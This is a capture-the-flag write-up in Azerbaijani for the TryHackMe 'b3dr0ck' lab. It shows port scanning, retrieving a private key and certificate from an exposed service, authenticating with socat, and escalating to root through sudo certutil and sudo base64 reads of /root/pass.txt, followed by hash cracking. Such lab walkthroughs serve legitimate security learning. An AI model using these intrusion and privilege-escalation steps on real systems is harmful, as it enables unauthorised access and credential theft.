# TryHackMe — b3dr0ck Writeup (Azərbaycanca)

---

## 📋 Otaq Haqqında

**Çətinlik:** Medium  
**Mövzu:** TLS sertifikatlar, socat, certutil, privilege escalation  
**Ssenariy:** Barney Rubble ABC veb serverini qurmağa çalışır və TLS
sertifikatlarından istifadə etmək istəyir, amma çətinlik çəkir.

---

## 1. 🔍 Kəşfiyyat (Nmap)

```bash
nmap -sC -sV -p- 10.80.166.110
```

**Açıq portlar:**

| Port  | Servis  | Qeyd |
|-------|---------|------|
| 22    | SSH     | Giriş üçün |
| 80    | HTTP    | nginx → 4040-a yönləndirir |
| 4040  | HTTPS   | TLS veb server |
| 9009  | pichat  | Sertifikat alma servisi |
| 54321 | SSL     | Təhlükəsiz giriş qapısı |

---

## 2. 💬 Pichat Servisi (Port 9009)

Port 9009-da sadə bir chat/axtarış servisi işləyir.
`nc` ilə qoşulub sertifikat və açarı aldıq:

```bash
nc 10.80.166.110 9009
```

**Barney-nin Private Key-i:**
```
What are you looking for? secret
→ -----BEGIN RSA PRIVATE KEY----- verir
```

**Barney-nin Certificate-i:**
```
What are you looking for? certificate
→ -----BEGIN CERTIFICATE----- verir
```

Hər ikisini fayllara saxladıq:
```bash
nano /home/kali/key.pem    # Private Key-i yapışdır
nano /home/kali/cert.pem   # Certificate-i yapışdır
```

---

## 3. 🔐 SSL Servisinə Giriş (Port 54321)

`socat` ilə sertifikat və açarı istifadə edərək qoşulduq:

```bash
socat stdio ssl:10.80.166.110:54321,cert=/home/kali/cert.pem,key=/home/kali/key.pem,verify=0
```

Cavab:
```
Welcome: 'Barney Rubble' is authorized.
b3dr0ck>
```

### ⚠️ Mühüm İpucu!

`b3dr0ck>` promptunda `help` yazanda:
```
b3dr0ck> help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
```

> **"Password hint" — hint deyil, şifrənin özüdür!**
> Hash-i crack etməyə çalışma — bu hash-in özü Barney-nin SSH şifrəsidir!

---

## 4. 🖥️ SSH ilə Barney Girişi

```bash
ssh barney@10.80.166.110
# Şifrə: d1ad7c0a3805955a35eb260dab4180dd
```

Daxil olduqdan sonra:
```bash
cat ~/barney.txt   # Barney flag-i
```

🚩 **Flag 1 (barney.txt):** `THM{...}`

---

## 5. 🔑 Fred-in Şifrəsini Tapmaq (Privilege Escalation)

### sudo imkanlarını yoxla:
```bash
sudo -l
```

Çıxan nəticə:
```
(ALL) NOPASSWD: /usr/bin/certutil
```

Barney `certutil`-i root ilə işlədə bilər!

### Mövcud sertifikatları listələ:
```bash
certutil ls
```

Fred-ə aid fayllar görünür.

### Fred-in sertifikat və key-ini al:
```bash
sudo certutil -a fred.csr.pem
```

Bu komanda Fred-in **private key** və **certificate**-ini verir.
Hər ikisini fayllara saxla:
```bash
nano /home/kali/fred_key.pem
nano /home/kali/fred_cert.pem
```

### Fred üçün socat ilə qoşul:
```bash
socat stdio ssl:10.80.166.110:54321,cert=/home/kali/fred_cert.pem,key=/home/kali/fred_key.pem,verify=0
```

```
b3dr0ck> help
Password hint: XXXXXXXXXXXXXXXXXX (user = 'Fred Flintstone')
```

> **Yenə eyni qayda — bu hash Fred-in şifrəsidir!**

---

## 6. 🦎 Fred Girişi

```bash
# Barney-nin shell-indən:
su - fred
# Şifrə: Fred-in hash-i

# Və ya SSH ilə:
ssh fred@10.80.166.110
```

```bash
cat ~/fred.txt   # Fred flag-i
```

🚩 **Flag 2 (fred.txt):** `THM{...}`

---

## 7. 👑 Root-a Keçid

### Fred-in sudo imkanları:
```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/base64
```

Fred `/usr/bin/base64` ilə root fayllarını oxuya bilər!

### Root şifrəsini oxu:
```bash
sudo /usr/bin/base64 /root/pass.txt | base64 -d
```

Çıxan nəticə **çoxlu dəfə encode edilmiş** stringdir.

### CyberChef ilə decode et:
1. **gchq.github.io/CyberChef** saytına get
2. Stringi yapışdır
3. **Magic** əməliyyatını istifadə et (sehrli çubuq ikonu)
4. Avtomatik olaraq decode edəcək: `Base64 → Base32 → MD5 hash`

### MD5 hash-i crack et:
Çıxan MD5 hash-i **crackstation.net**-ə yapışdır → Root şifrəsi tapılır!

### Root-a gir:
```bash
su -
# Root şifrəsini daxil et
```

```bash
cat /root/root.txt
```

🚩 **Flag 3 (root.txt):** `THM{...}`

---

## 8. 🗺️ Tam Attack Chain

```
Nmap skanı → 5 açıq port
        ↓
Port 9009 (pichat) → "secret" + "certificate"
        ↓
Barney-nin key.pem + cert.pem saxlandı
        ↓
socat ssl:54321 → b3dr0ck> shell
        ↓
"help" → Password hint = ŞİFRƏNİN ÖZÜ!
        ↓
SSH barney@IP → barney.txt FLAG 🚩
        ↓
sudo -l → certutil icazəsi var
        ↓
sudo certutil -a fred.csr.pem → Fred-in key+cert
        ↓
socat ssl:54321 (Fred cert) → Fred şifrəsi
        ↓
su fred → fred.txt FLAG 🚩
        ↓
sudo -l → /usr/bin/base64 icazəsi var
        ↓
sudo base64 /root/pass.txt → encode string
        ↓
CyberChef Magic → MD5 hash → crackstation.net → root şifrəsi
        ↓
su root → root.txt FLAG 🚩
```

---

## 9. 📝 Əsas Öyrənilənlər

| Konsept | İzah |
|---------|------|
| **TLS/SSL** | Şifrəli əlaqə texnologiyası |
| **socat** | SSL dəstəkli nc alternativi |
| **certutil** | Sertifikat idarəetmə aləti |
| **base64 sudo** | `/usr/bin/base64` ilə root faylları oxumaq |
| **Password hint trick** | "Hint" deyil, şifrənin özüdür! |
| **CyberChef Magic** | Avtomatik encode aşkar edir |

---

## 10. ⚠️ Ən Mühüm İpucu

> `b3dr0ck>` promptunda **help** yazanda çıxan hash
> **crack edilməyəcək** — bu hash-in özü birbaşa SSH şifrəsidir!
> Crack etməyə vaxt itirmə!

---

*Hazırladı: CTF Player | TryHackMe — b3dr0ck*
